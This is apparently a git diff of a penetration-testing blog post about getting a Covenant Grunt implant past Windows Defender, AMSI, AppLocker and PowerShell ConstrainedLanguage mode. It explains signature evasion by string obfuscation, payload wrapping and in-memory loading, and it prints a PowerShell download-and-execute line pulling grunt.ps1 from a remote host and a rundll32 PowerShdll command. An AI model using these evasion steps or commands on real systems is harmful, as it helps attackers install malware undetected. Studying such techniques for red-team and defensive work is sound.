@@ -17,6 +17,8 @@ What can be done against AppLocker?
 What about PowerShell´s ConstrainedLanguage Mode?  
 AMSI who?  
 
+*Please excuse all the screenshots in german language. It seems I am too dumb to change OS language in my lab. I promise to do better next time.*
+
 ## Introduction  
 
 During pentests or Red Team assessments, it all comes down to our beloved toolbox, containing all the usefull and naughty stuff of a pentester´s every day life. 
@@ -44,11 +46,11 @@ Well that´s just one of the possible situations you might run into. So let´s w
 
 ## Bypassing AV  
 
-If we consider traditional anti virus software (and even today they work like this - at least in parts), they all have some kind of database which contains like hashes of known malicious files, strings that are known the be in evil software (hello *sekurlsa::logoncredentials*) and so on. These are updated as soon as the vendor is able to spot new threats and sold as Threat Intel.  
-So when ever AV is able to investigate filebased actions e.g. when you open a file and AV hooks in and does a check of the content inside, it will perform it´s tasks to evaluate what it sees against its database, and as a result will give you thumbs up or down.  
+If we consider traditional anti virus software (and even today they work like this - at least in parts), they all have some kind of database which contains like hashes or byte sequences of known malicious files, strings that are known the be in *evil* software (hello *sekurlsa::logonpasswords*) and so on. These are updated as soon as the vendor is able to spot new threats and sold as *Threat Intel*.  
+So whenever an AV is able to investigate file-based actions, e.g. when you open a file, and AV hooks in and does a check of the content inside, it will perform it´s tasks to evaluate what it sees against its database, and as a result will give you thumbs up or down.  
 
 So our option here is obvious:  
-Everything you use out of the box will sooner or later get flagged by the AV vendors by integrating according detection mechanisms into their database.  
+Every publicly available tool or technique you use out of the box will sooner or later get flagged by the AV vendors by integrating according detection mechanisms into their database.  
 That´s where obfuscation comes into play. If you haven´t done so already, I highly recommend you take your time to read through some of [s3cur3th1sh1t´s](https://twitter.com/ShitSecure) [blog posts](https://s3cur3th1ssh1t.github.io) related to this topic.  
 
 Obfuscation can be as simple as doing string replacements or as complex as encrypting whole binaries that unfold at runtime.  
@@ -66,11 +68,11 @@ namespace GruntStager
             ExecuteStager();
 ```
 You can bet your ass that if some kind of AV sees the string ```GruntStager``` it will fall into havoc.  
-Having that code in our VisualStudio we can highlight the string we want to replace and hit ```ctrl + r``` and type the new name to rename it throughout the whole project. We will also apply this to the public class and all other suspicious sounding parts we find and will eventually end up with something like this:
+Having that code in our VisualStudio we can highlight the string we want to replace and hit ```ctrl + r``` to rename functions or variables or ```ctrl + alt + h``` to find and replace strings throughout the whole project. We will also apply this to the public class and all other suspicious sounding parts we find and will eventually end up with something like this:
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/stager_rename.png "rename")
 
-What we can also do is concatenating strings instead of replacing them. So that ```GruntStager``` becomes ```'Gru'+'ntS'+'ta'+'ger'```.  
+What we can also do is concatenating strings instead of replacing them. So that e.g. ```mimikatz``` becomes ```'mi'+'mik'+'atz'```.  
 In several cases this is enough to fool AV if done properly.  
 
 A usefull tool that comes in handy when you want to test your new code against Windows Defender or AMSI signatures is [Raste Mouse´s](https://twitter.com/_RastaMouse)[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It will basically split your code into chunks of specific length and test it against the database of Windows Defender or AMSI, and tell you where in your code it gets flagged.
@@ -81,23 +83,23 @@ There are tools out there, that will do the obfuscation job for you. Feel free t
 
 ### Wrapping and decrypting code  
 
-If you are actively following the InfoSec community on twitter, you will most probably stumble upon [byt3bl33d3r´s](https://twitter.com/byt3bl33d3r) [Offensive Nim repo](https://github.com/byt3bl33d3r/OffensiveNim). These templates let you wrap your C# executable inside Nim and be compiled as C executable, thus hiding your content. Together with [s3cur3th1sh1t](https://twitter.com/ShitSecure) they even developed it further, so that you can have a decrypted payload inside the Nim binary, and have it decrypted at runtime in memory. This will make it way harder to impossible to reverse, if you have to put your files to disk, as decompiling will only reveal the encrypted C# stuff. To learn more on this you can check out [Playing-with-OffensiveNim](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/).  
+If you are actively following the InfoSec community on twitter, you will most probably stumble upon [byt3bl33d3r´s](https://twitter.com/byt3bl33d3r) [Offensive Nim repo](https://github.com/byt3bl33d3r/OffensiveNim). These templates let you for example wrap your C# executable inside Nim and be compiled as C executable, thus hiding your content. Together with [s3cur3th1sh1t](https://twitter.com/ShitSecure) they even developed it further, so that you can have an encrypted payload inside the Nim binary, and decrypt at runtime in memory. This will make it harder to reverse, if you have to put your files to disk, as decompiling will only reveal the encrypted C# stuff. To learn more on this you can check out [Playing-with-OffensiveNim](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/).  
 
 There are also tools like [amber](https://github.com/EgeBalci/amber) or [PEzor](https://github.com/phra/PEzor), which will take C or C++ executables and reflectively load them into memory, adding some nice features like delayed execution too fool in memory scanners or avoiding AV user-land hooks and stuff. I don´t understand even half of the things that are going on here. But if you want to know more read [phra´s](https://twitter.com/phraaaaaaa) [blog](https://iwantmore.pizza/posts/PEzor.html) regarding PEZor.  
 
-All the above mentioned methods can possibly help you obfuscate your code, so you don´t have to deploy the out of the box tools.  
+All the methods mentioned abovecan possibly help you obfuscate your code, so you don´t have to deploy the out of the box tools.  
 But be aware that by the time also the wrapper code will get flagged. I did a test with a simple ```hello world``` C executable wrapped with PEZor, and I got like 21 hits on VirusTotal.
-By now you should know what to do :) Obfuscate the wrappers.  
+By now you should know what to do :) Obfuscate the templates.  
 
 ### Not touching the disk  
 
-Another approach is to try to not touch the disk with our malicious content, so that traditional AV is not able to catch us when reading or writing data.  
-The most well known technique to me is to use PowerShell´s Invoke Expression feature. It will allow you to download a script from a remote source and execute it in memory.  
+Another approach is to not touch the disk with our malicious content, so that traditional AV is not able to catch us when reading or writing data.  
+The most well known technique to me is to use PowerShell´s native Invoke Expression function. It will allow you to download a script from a remote source and execute it in memory.  
 ```
 iex(new-object net.webclient).downloadstring('http://10.55.0.30/grunt.ps1')
 ```  
 
-Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t, to load and execute C# directly into memory.  
+Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t, to load and execute C# directly from memory.  
     
 Okay so let´s bypass Defender by not touching the disk and put our default Grunt payload directly into memory:
 
@@ -106,6 +108,7 @@ Okay so let´s bypass Defender by not touching the disk and put our default Grun
 *Fuck! Something went wrong. Looks like we got catched by AMSI which detected a Covenant payload.*  
 
 We bypassed the signature based part of Defender for the filesystem stuff, but AMSI checked our script when we loaded it to memory, handed it over to Defender who then found the suspicious strings, flagging it as malicious.  
+A more precise explaination would be that the script itself didn´t get flagged, but the C# Grunt stager which is loaded via ```Assembly::load``` into powershell. Thanks to [s3cur3th1sh1t](https://twitter.com/ShitSecure) for the clarification at this point.  
 
 If you would like to know more about how AMSI works - read this [post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about AMSI and how to bypass it.  
 
@@ -114,7 +117,8 @@ We can verify that it was AMSI by issuing ~~one of the random bypasses from [ams
 ![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass.png "bypass")  
 ![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass_grunt.png "bypass")  
 
-I failed hard for several times with all the [amsi.fail](https://amsi.fail) bypasses for the Grunt payload. Talking to my boss (*you know the guy with the l33t name containing sh1t and stuff*) it turns out that for C# payloads - the 2nd stage of the Grunt payload which is C# - you need to have a bypass for C#. Holy moly, but that´s how it is. Thank you sir.   
+I failed hard for several times with all the [amsi.fail](https://amsi.fail) bypasses for the Grunt payload. Talking to my boss (*you know the guy with the l33t name containing sh1t and stuff*) it turns out that for C# payloads - the 1st and 2nd stage of the Grunt payload which are written in C# - you need to have a bypass in C#. You can see that the Rasta Mouse´s bypass is loading C# code in PowerShell via the ```Add-Type $Win32``` statement at the beginning.  
+*Holy moly, but that´s how it is. Thank you sir.*   
 
 ### Chaining the tricks 
 
@@ -151,7 +155,7 @@ Just to try to avoid local detection when copied to disk.
    *Tada - Grunt incoming*  
    ![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_success.png "PEZor success")  
 
-#### AppLocker & Constrained language bypass -> Powershell load script -> AMSI bypass -> Invoke-SharpLoader -> Encrypted Grunt
+#### AppLocker & ConstrainedLanguage mode bypass -> Powershell load script -> AMSI bypass -> Invoke-SharpLoader -> Encrypted Grunt
 
 If there wasn´t the AppLocker bypass needed, one could also run this completely from remote, i.e. in a phishing campaign starting with a .htm file or something like this, which runs our loader script.  
 The whole attack is carried out on a low priv account.  
@@ -181,13 +185,13 @@ The whole attack is carried out on a low priv account.
 
    ![broken]({{ site.baseurl }}/images/2021-16-01/acl_users_allowed.png  "Allowed users ACL")
 
-   Which shows us that the **Users** group has write access to that specific folder. *Perfect - someone fucked up here :)*  
+   Which shows us that the **Users** group has write access to that specific folder. *Perfect - someone fucked up here. In Germany we say:"Hart verkackt."*  
 
 2. Bypass AppLocker and ConstrainedLanguage  
   
    So now that we know how - let´s get our hands dirty.  
 
-   Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy to client to **C:\Program Files (x86)\hMailServer\\*\* and run it:  
+   Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy the dll to the client to **C:\Program Files (x86)\hMailServer\\*\* and run it:  
    ```
    rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w
    ```  
